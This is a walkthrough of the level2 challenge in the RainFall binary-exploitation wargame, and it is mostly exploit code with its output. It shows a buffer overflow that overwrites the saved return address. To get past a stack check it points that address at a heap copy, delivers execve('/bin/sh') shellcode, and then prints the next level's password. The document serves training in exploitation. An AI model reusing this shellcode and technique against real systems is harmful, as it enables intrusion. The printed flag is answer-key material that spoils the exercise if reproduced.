# Walkthrough level2

Try to override saved EIP with 'CCCC':

```bash
level2@RainFall:~$ python -c "print('A' * 76 + 'B' * 4 + 'CCCC')" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCAAAAAAAABBBBCCCC
Segmentation fault (core dumped)
```

Here we don't have function who call `system("/bin/sh")` or something like so
we need to use a [shellcode](https://en.wikipedia.org/wiki/Shellcode).
To execute our shellcode we need to override saved EIP to point on it.
We can't use a pointer on the stack because there is a check if EIP is on the
stack. To avoid this we can use a heap pointer (thanks to `strdup`).

Try to run [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html):

```bash
level2@RainFall:~$ python -c "print('\x90' * 26 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * 26 + '\x08\xa0\x04\x08')" > /tmp/payload
level2@RainFall:~$ cat - | ./level2 < /tmp/payload
1Ph//shh/bin°
             ̀1@̀AAAAAAAAAAAAAAAAAAAA
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
